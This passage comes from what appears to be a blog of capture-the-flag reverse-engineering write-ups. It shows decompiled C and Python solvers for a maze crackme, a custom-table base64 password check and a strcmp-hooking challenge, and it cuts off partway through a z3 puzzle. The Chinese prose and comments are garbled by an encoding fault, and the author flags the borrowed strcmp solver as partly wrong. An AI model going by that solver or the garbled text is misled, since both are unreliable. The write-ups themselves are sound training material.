 &#123;</span><br><span class="line">      <span class="keyword">if</span> ( input[v3] != <span class="string">&#x27;E&#x27;</span> || v4 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( input[v3] != <span class="string">&#x27;M&#x27;</span> || v4 == <span class="number">0x10</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( input[v3] != <span class="string">&#x27;J&#x27;</span> || v4 == <span class="number">0xFFFFFFFF</span> )</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">          v4 = <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v4 = <span class="number">0x10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v4 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = <span class="number">0xFFFFFFF0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v3;</span><br><span class="line">    <span class="keyword">while</span> ( !<span class="built_in">map</span>[now] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="number">-1</span> &amp;&amp; (now &amp; <span class="number">0xF</span>) == <span class="number">0</span> )       <span class="comment">// åœ¨æœ€å·¦è¾¹</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="number">1</span> &amp;&amp; now % <span class="number">16</span> == <span class="number">15</span> )          <span class="comment">// åœ¨æœ€å³è¾¹</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="number">0x10</span> &amp;&amp; (now - <span class="number">240</span>) &lt;= <span class="number">15</span> )    <span class="comment">// åœ¨æœ€åä¸€è¡Œ</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="number">0xFFFFFFF0</span> &amp;&amp; (now + <span class="number">15</span>) &lt;= <span class="number">30</span> )<span class="comment">// åœ¨ç¬¬ä¸€è¡Œ</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      now += v4;                                <span class="comment">// æ¯æ¬¡å¯ä»¥ä¸€ç›´èµ°</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> input[v3] == <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¯æ¬¡åªè¦æ²¡æ’åˆ°å¢™éƒ½å¯ä»¥ä¸€ç›´èµ°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="built_in">map</span>[] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">35</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">35</span>,  <span class="number">35</span>,  <span class="number">35</span>,  <span class="number">35</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">35</span>, </span><br><span class="line">   <span class="number">35</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">79</span>,  <span class="number">79</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">79</span>,  <span class="number">79</span>,   <span class="number">0</span>,  <span class="number">80</span>,  <span class="number">80</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,  <span class="number">76</span>,   <span class="number">0</span>,  <span class="number">79</span>,  <span class="number">79</span>,   <span class="number">0</span>,  <span class="number">79</span>,  <span class="number">79</span>,   <span class="number">0</span>,  <span class="number">80</span>, </span><br><span class="line">   <span class="number">80</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">76</span>,   <span class="number">0</span>,  <span class="number">79</span>, </span><br><span class="line">   <span class="number">79</span>,   <span class="number">0</span>,  <span class="number">79</span>,  <span class="number">79</span>,   <span class="number">0</span>,  <span class="number">80</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">76</span>,  <span class="number">76</span>,   <span class="number">0</span>,  <span class="number">79</span>,  <span class="number">79</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,  <span class="number">80</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,  <span class="number">79</span>,  <span class="number">79</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">80</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">35</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">35</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">77</span>,  <span class="number">77</span>,  <span class="number">77</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">35</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">77</span>,  <span class="number">77</span>,  <span class="number">77</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">69</span>,  <span class="number">69</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">48</span>, </span><br><span class="line">    <span class="number">0</span>,  <span class="number">77</span>,   <span class="number">0</span>,  <span class="number">77</span>,   <span class="number">0</span>,  <span class="number">77</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">69</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">69</span>,  <span class="number">69</span>,  <span class="number">84</span>,  <span class="number">84</span>, </span><br><span class="line">   <span class="number">84</span>,  <span class="number">73</span>,   <span class="number">0</span>,  <span class="number">77</span>,   <span class="number">0</span>,  <span class="number">77</span>,   <span class="number">0</span>,  <span class="number">77</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">69</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">84</span>,   <span class="number">0</span>,  <span class="number">73</span>,   <span class="number">0</span>,  <span class="number">77</span>, </span><br><span class="line">    <span class="number">0</span>,  <span class="number">77</span>,   <span class="number">0</span>,  <span class="number">77</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">69</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,  <span class="number">84</span>,   <span class="number">0</span>,  <span class="number">73</span>,   <span class="number">0</span>,  <span class="number">77</span>,   <span class="number">0</span>,  <span class="number">77</span>,   <span class="number">0</span>,  <span class="number">77</span>, </span><br><span class="line">   <span class="number">33</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">69</span>,  <span class="number">69</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//MEWEMEWJMEWJM</span></span><br></pre></td></tr></table></figure><h1 id="0x1C-FlareOn3-Challenge1"><a href="#0x1C-FlareOn3-Challenge1" class="headerlink" title="0x1C.[FlareOn3]Challenge1"></a>0x1C.[FlareOn3]Challenge1</h1><p>æ— å£³ï¼Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> Buffer[<span class="number">128</span>]; <span class="comment">// [esp+0h] [ebp-94h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> *Str1; <span class="comment">// [esp+80h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> *Str2; <span class="comment">// [esp+84h] [ebp-10h]</span></span><br><span class="line">  HANDLE v7; <span class="comment">// [esp+88h] [ebp-Ch]</span></span><br><span class="line">  HANDLE hFile; <span class="comment">// [esp+8Ch] [ebp-8h]</span></span><br><span class="line">  DWORD NumberOfBytesWritten; <span class="comment">// [esp+90h] [ebp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  hFile = GetStdHandle(<span class="number">0xFFFFFFF5</span>);</span><br><span class="line">  v7 = GetStdHandle(<span class="number">0xFFFFFFF6</span>);</span><br><span class="line">  Str2 = <span class="string">&quot;x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q&quot;</span>;</span><br><span class="line">  WriteFile(hFile, <span class="string">&quot;Enter password:\r\n&quot;</span>, <span class="number">0x12</span>u, &amp;NumberOfBytesWritten, <span class="number">0</span>);</span><br><span class="line">  ReadFile(v7, Buffer, <span class="number">0x80</span>u, &amp;NumberOfBytesWritten, <span class="number">0</span>);</span><br><span class="line">  Str1 = sub_401260(Buffer, NumberOfBytesWritten - <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(Str1, Str2) )</span><br><span class="line">    WriteFile(hFile, <span class="string">&quot;Correct!\r\n&quot;</span>, <span class="number">0xB</span>u, &amp;NumberOfBytesWritten, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    WriteFile(hFile, <span class="string">&quot;Wrong password\r\n&quot;</span>, <span class="number">0x11</span>u, &amp;NumberOfBytesWritten, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">_BYTE *__cdecl <span class="title">sub_401260</span><span class="params">(<span class="keyword">char</span> *input, DWORD size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+10h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+14h] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+1Ch] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// [esp+20h] [ebp-10h]</span></span><br><span class="line">  _BYTE *v8; <span class="comment">// [esp+24h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+28h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [esp+28h] [ebp-8h]</span></span><br><span class="line">  DWORD v11; <span class="comment">// [esp+2Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v8 = <span class="built_in">malloc</span>(<span class="number">4</span> * ((size + <span class="number">2</span>) / <span class="number">3</span>) + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v8 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v11 &lt; size )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = input[v11];</span><br><span class="line">    <span class="keyword">if</span> ( ++v11 &gt;= size )</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v4 = input[v11++];</span><br><span class="line">    <span class="keyword">if</span> ( v11 &gt;= size )</span><br><span class="line">      v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v3 = input[v11++];</span><br><span class="line">    v7 = v3 + (v5 &lt;&lt; <span class="number">16</span>) + (v4 &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    v8[v9] = aZyxabcdefghijk[(v7 &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v10 = v9 + <span class="number">1</span>;</span><br><span class="line">    v8[v10] = aZyxabcdefghijk[(v7 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v8[++v10] = aZyxabcdefghijk[(v7 &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v8[++v10] = aZyxabcdefghijk[v3 &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v9 = v10 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; *&amp;aZyxabcdefghijk[<span class="number">4</span> * (size % <span class="number">3</span>) + <span class="number">64</span>]; ++i )</span><br><span class="line">    v8[<span class="number">4</span> * ((size + <span class="number">2</span>) / <span class="number">3</span>) - i - <span class="number">1</span>] = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">  v8[<span class="number">4</span> * ((size + <span class="number">2</span>) / <span class="number">3</span>)] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å˜è¡¨çš„base64ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">str1 = <span class="string">&#x27;x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q&#x27;</span></span><br><span class="line">base = <span class="string">&#x27;ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/&#x27;</span></span><br><span class="line">table = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">a = base64.b64decode(str1.translate(<span class="built_in">str</span>.maketrans(base, table)))</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><h1 id="0x1D-Zer0pts2020-easy-strcmp"><a href="#0x1D-Zer0pts2020-easy-strcmp" class="headerlink" title="0x1D.[Zer0pts2020]easy strcmp"></a>0x1D.[Zer0pts2020]easy strcmp</h1><p>åˆå­¦åˆ°äº†ä¸ªå°ä¸œè¥¿ï¼Œåœ¨mainä¹‹å‰ä¼šå…ˆæ‰§è¡Œinitï¼Œæœ€åä¼šfiniä¹Ÿå°±æ˜¯è¯´ï¼š</p><p>åœ¨æ‰§è¡Œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a2[<span class="number">1</span>], <span class="string">&quot;zer0pts&#123;********CENSORED********&#125;&quot;</span>) )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s &lt;FLAG&gt;\n&quot;</span>, *a2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹‹å‰ï¼Œå…ˆæ‰§è¡Œäº†initï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">init</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 v4; <span class="comment">// rbp</span></span><br><span class="line">  __int64 i; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  v4 = &amp;off_200DF0 - &amp;funcs_889;</span><br><span class="line">  init_proc();</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i != v4; ++i )</span><br><span class="line">      ((<span class="keyword">void</span> (__fastcall *)(_QWORD, __int64, __int64))*(&amp;funcs_889 + i))(a1, a2, a3);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œè¿™é‡Œé¢æ˜¯æ‰§è¡Œäº†ä¸¤ä¸ªä¹‹é—´çš„æ‰€æœ‰å‡½æ•°ï¼š</p><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211031232427647.png" alt="image-20211031232427647"></p><p>å…¶ä¸­é‡è¦çš„å°±æ˜¯795çš„é‚£ä¸ªå‡½æ•°äº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> (**sub_795())(<span class="keyword">const</span> <span class="keyword">char</span> *s1, <span class="keyword">const</span> <span class="keyword">char</span> *s2)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> (**result)(<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *); <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = &amp;<span class="built_in">strcmp</span>;</span><br><span class="line">  qword_201090 = (__int64)&amp;<span class="built_in">strcmp</span>;</span><br><span class="line">  off_201028 = sub_6EA;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å§strcmpçš„å‡½æ•°æ¢ä¸ºäº†sub_6EAï¼Œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_6EA</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; *(_BYTE *)(i + a1); ++i )</span><br><span class="line">    ;</span><br><span class="line">  v4 = (i &gt;&gt; <span class="number">3</span>) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v4; ++j )</span><br><span class="line">    *(_QWORD *)(<span class="number">8</span> * j + a1) -= qword_201060[j];</span><br><span class="line">  <span class="keyword">return</span> qword_201090(a1, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç½‘ä¸Šçš„expï¼Œæ€ä¹ˆè¯´å‘¢ï¼Œä¸­é—´é‚£å—ç®—çš„è¿˜æ˜¯æœ‰é—®é¢˜</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">enc = <span class="string">&quot;********CENSORED********&quot;</span></span><br><span class="line">m = [<span class="number">0x410A4335494A0942</span>, <span class="number">0x0B0EF2F50BE619F0</span>, <span class="number">0x4F0A3A064A35282B</span>]</span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    p = enc[i*<span class="number">8</span>:(i+<span class="number">1</span>)*<span class="number">8</span>]</span><br><span class="line">    a = binascii.b2a_hex(p.encode(<span class="string">&#x27;ascii&#x27;</span>)[::-<span class="number">1</span>])</span><br><span class="line">    b = binascii.a2b_hex(<span class="built_in">hex</span>(<span class="built_in">int</span>(a, <span class="number">16</span>) + m[i])[<span class="number">2</span>:])[::-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(a, b, <span class="built_in">hex</span>(m[i]))</span><br><span class="line">    flag += b</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h1 id="0x1E-UTCTF2020-basic-re"><a href="#0x1E-UTCTF2020-basic-re" class="headerlink" title="0x1E.[UTCTF2020]basic-re"></a>0x1E.[UTCTF2020]basic-re</h1><p>å­—ç¬¦ä¸²flag</p><h1 id="0x1F-ACTFæ–°ç”Ÿèµ›2020-Universe-final-answer"><a href="#0x1F-ACTFæ–°ç”Ÿèµ›2020-Universe-final-answer" class="headerlink" title="0x1F.[ACTFæ–°ç”Ÿèµ›2020]Universe_final_answer"></a>0x1F.[ACTFæ–°ç”Ÿèµ›2020]Universe_final_answer</h1><p>z3çš„é¢˜ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> __fastcall <span class="title">sub_860</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// er9</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// er11</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ebp</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// er8</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// er10</span></span><br><span class="line">  <span class="keyword">bool</span> result; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+0h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">  v1 = a1[<span class="number">1</span>];</span><br><span class="line">  v2 = *a1;</span><br><span class="line">  v3 = a1[<span class="number">2</span>];</span><br><span class="line">  v4 